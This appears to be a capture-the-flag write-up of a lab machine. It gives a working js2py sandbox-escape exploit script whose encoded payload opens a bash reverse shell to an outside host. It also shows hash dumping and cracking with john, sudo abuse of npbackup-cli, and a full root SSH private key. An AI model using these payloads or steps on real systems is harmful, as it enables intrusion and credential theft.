1. I find the some js code execution terminal on "open port 8000"
----------------------------------------------------------------
2.I got that service that vulnerbale to the "https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/README.md"
And I git the reverse shell with that.
```bash
import requests  
import json  
  
url = 'http://10.10.11.82:8000/run_code'  
  
js_code = """  
let cmd = "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNC8xMzM3IDA+JjEpICY=|base64 -d|bash";  
let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__;  
let obj = a(a(a,"__class__"), "__base__");  
function findpopen(o) {  
    let result;    for(let i in o.__subclasses__()) {        let item = o.__subclasses__()[i];        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {            return item;        }        if(item.__name__ != "type" && (result = findpopen(item))) {            return result;        }    }}  
let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();  
console.log(result);  
result;  
"""  
  
payload = {"code": js_code}  
  
headers = {"Content-Type": "application/json"}  
  
r = requests.post(url, data=json.dumps(payload), headers=headers)  
print(r.text)
```
--------------------------------------------------------------------------------------------------------------------------------------------
3. I got the reverseshell 
 ```bash                                                                                                                                                            
┌──(sabeshan㉿kali)-[~]
└─$ nc -lvnp 1337                      
listening on [any] 1337 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.82] 37490
whoami           
app
pytho3n --version
bash: line 2: pytho3n: command not found
python3 --version
Python 3.8.10
python3 -c 'import pty;pty.spawn("/bin/bash")'
app@codetwo:~/app$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                                                             
┌──(sabeshan㉿kali)-[~]
└─$ stty raw -echo; fg      
[1]  + continued  nc -lvnp 1337

app@codetwo:~/app$ export TERM=xterm
app@codetwo:~/app$ 
-----------------------------------------------------------------------------------------------------------------------------------------------
```
4. I get the initial enumeration and got the users.db file and I find the hashes file in there.
```bash
app@codetwo:~/app$ ls -la
total 32
drwxrwxr-x 6 app app 4096 Feb 23 05:18 .
drwxr-x--- 5 app app 4096 Apr  6 03:22 ..
-rw-r--r-- 1 app app 3675 Feb  1  2025 app.py
drwxrwxr-x 2 app app 4096 Aug 22 17:50 instance
drwxr-xr-x 2 app app 4096 Feb  1  2025 __pycache__
-rw-rw-r-- 1 app app   49 Jan 17  2025 requirements.txt
drwxr-xr-x 4 app app 4096 Jun 11 07:51 static
drwxr-xr-x 2 app app 4096 Jun 26 13:43 templates
app@codetwo:~/app$ cd instance
app@codetwo:~/app/instance$ ls 0la
ls: cannot access '0la': No such file or directory
app@codetwo:~/app/instance$ ls -la
total 24
drwxrwxr-x 2 app app  4096 Aug 22 17:50 .
drwxrwxr-x 6 app app  4096 Feb 23 05:18 ..
-rw-r--r-- 1 app app 16384 Aug 22 18:00 users.db
app@codetwo:~/app/instance$ sqlite3 users.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password_hash VARCHAR(128) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
);
INSERT INTO user VALUES(1,'marco','649c9d65a206a75f5abe509fe128bce5');
INSERT INTO user VALUES(2,'app','a97588c0e2fa3a024876339e27aeb42e');
CREATE TABLE code_snippet (
        id INTEGER NOT NULL, 
        user_id INTEGER NOT NULL, 
        code TEXT NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
);
COMMIT;
sqlite>
And now i'm going to crack the passwords by using "https://md5hashing.net/hash".

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-md5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetangelbabylove (?)     
1g 0:00:00:00 DONE (2025-08-23 15:11) 1.724g/s 5946Kp/s 5946Kc/s 5946KC/s sweetart098..sweetali786
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
----------------------------------------------------------------------------------------
```
5. I got the configuration and escalte the path using path get the root access with it
```bash
marco@codetwo:~$ sudo -l
Matching Defaults entries for marco on codetwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codetwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
marco@codetwo:~$
------
cat npbackup.conf 
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```
I change the path to the root and i can read the root file includiing ssh configs
----------------------------------------------------------------------------------------------------------------------------
6. I got the root privildges with retriving this private key
```bash
marco@codetwo:~$ sudo npbackup-cli -c npbackup.conf -f --dump /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA9apNjja2/vuDV4aaVheXnLbCe7dJBI/l4Lhc0nQA5F9wGFxkvIEy
VXRep4N+ujxYKVfcT3HZYR6PsqXkOrIb99zwr1GkEeAIPdz7ON0pwEYFxsHHnBr+rPAp9d
EaM7OOojou1KJTNn0ETKzvxoYelyiMkX9rVtaETXNtsSewYUj4cqKe1l/w4+MeilBdFP7q
kiXtMQ5nyiO2E4gQAvXQt9bkMOI1UXqq+IhUBoLJOwxoDwuJyqMKEDGBgMoC2E7dNmxwJV
XQSdbdtrqmtCZJmPhsAT678v4bLUjARk9bnl34/zSXTkUnH+bGKn1hJQ+IG95PZ/rusjcJ
hNzr/GTaAntxsAZEvWr7hZF/56LXncDxS0yLa5YVS8YsEHerd/SBt1m5KCAPGofMrnxSSS
pyuYSlw/OnTT8bzoAY1jDXlr5WugxJz8WZJ3ItpUeBi4YSP2Rmrc29SdKKqzryr7AEn4sb
JJ0y4l95ERARsMPFFbiEyw5MGG3ni61Xw62T3BTlAAAFiCA2JBMgNiQTAAAAB3NzaC1yc2
EAAAGBAPWqTY42tv77g1eGmlYXl5y2wnu3SQSP5eC4XNJ0AORfcBhcZLyBMlV0XqeDfro8
WClX3E9x2WEej7Kl5DqyG/fc8K9RpBHgCD3c+zjdKcBGBcbBx5wa/qzwKfXRGjOzjqI6Lt
SiUzZ9BEys78aGHpcojJF/a1bWhE1zbbEnsGFI+HKintZf8OPjHopQXRT+6pIl7TEOZ8oj
thOIEAL10LfW5DDiNVF6qviIVAaCyTsMaA8LicqjChAxgYDKAthO3TZscCVV0EnW3ba6pr
QmSZj4bAE+u/L+Gy1IwEZPW55d+P80l05FJx/mxip9YSUPiBveT2f67rI3CYTc6/xk2gJ7
cbAGRL1q+4WRf+ei153A8UtMi2uWFUvGLBB3q3f0gbdZuSggDxqHzK58UkkqcrmEpcPzp0
0/G86AGNYw15a+VroMSc/FmSdyLaVHgYuGEj9kZq3NvUnSiqs68q+wBJ+LGySdMuJfeREQ
EbDDxRW4hMsOTBht54utV8Otk9wU5QAAAAMBAAEAAAGBAJYX9ASEp2/IaWnLgnZBOc901g
RSallQNcoDuiqW14iwSsOHh8CoSwFs9Pvx2jac8dxoouEjFQZCbtdehb/a3D2nDqJ/Bfgp
4b8ySYdnkL+5yIO0F2noEFvG7EwU8qZN+UJivAQMHT04Sq0yJ9kqTnxaOPAYYpOOwwyzDn
zjW99Efw9DDjq6KWqCdEFbclOGn/ilFXMYcw9MnEz4n5e/akM4FvlK6/qZMOZiHLxRofLi
1J0Elq5oyJg2NwJh6jUQkOLitt0KjuuYPr3sRMY98QCHcZvzUMmJ/hPZIZAQFtJEtXHkt5
UkQ9SgC/LEaLU2tPDr3L+JlrY1Hgn6iJlD0ugOxn3fb924P2y0Xhar56g1NchpNe1kZw7g
prSiC8F2ustRvWmMPCCjS/3QSziYVpM2uEVdW04N702SJGkhJLEpVxHWszYbQpDatq5ckb
SaprgELr/XWWFjz3FR4BNI/ZbdFf8+bVGTVf2IvoTqe6Db0aUGrnOJccgJdlKR8e2nwQAA
AMEA79NxcGx+wnl11qfgc1dw25Olzc6+Jflkvyd4cI5WMKvwIHLOwNQwviWkNrCFmTihHJ
gtfeE73oFRdMV2SDKmup17VzbE47x50m0ykT09KOdAbwxBK7W3A99JDckPBlqXe0x6TG65
UotCk9hWibrl2nXTufZ1F3XGQu1LlQuj8SHyijdzutNQkEteKo374/AB1t2XZIENWzUZNx
vP8QwKQche2EN1GQQS6mGWTxN5YTGXjp9jFOc0EvAgwXczKxJ1AAAAwQD7/hrQJpgftkVP
/K8GeKcY4gUcfoNAPe4ybg5EHYIF8vlSSm7qy/MtZTh2Iowkt3LDUkVXcEdbKm/bpyZWre
0P6Fri6CWoBXmOKgejBdptb+Ue+Mznu8DgPDWFXXVkgZOCk/1pfAKBxEH4+sOYOr8o9SnI
nSXtKgYHFyGzCl20nAyfiYokTwX3AYDEo0wLrVPAeO59nQSroH1WzvFvhhabs0JkqsjGLf
kMV0RRqCVfcmReEI8S47F/JBg/eOTsWfUAAADBAPmScFCNisrgb1dvow0vdWKavtHyvoHz
bzXsCCCHB9Y+33yrL4fsaBfLHoexvdPX0Ssl/uFCilc1zEvk30EeC1yoG3H0Nsu+R57BBI
o85/zCvGKm/BYjoldz23CSOFrssSlEZUppA6JJkEovEaR3LW7b1pBIMu52f+64cUNgSWtH
kXQKJhgScWFD3dnPx6cJRLChJayc0FHz02KYGRP3KQIedpOJDAFF096MXhBT7W9ZO8Pen/
MBhgprGCU3dhhJMQAAAAxyb290QGNvZGV0d28BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```
=====================================================================================================================
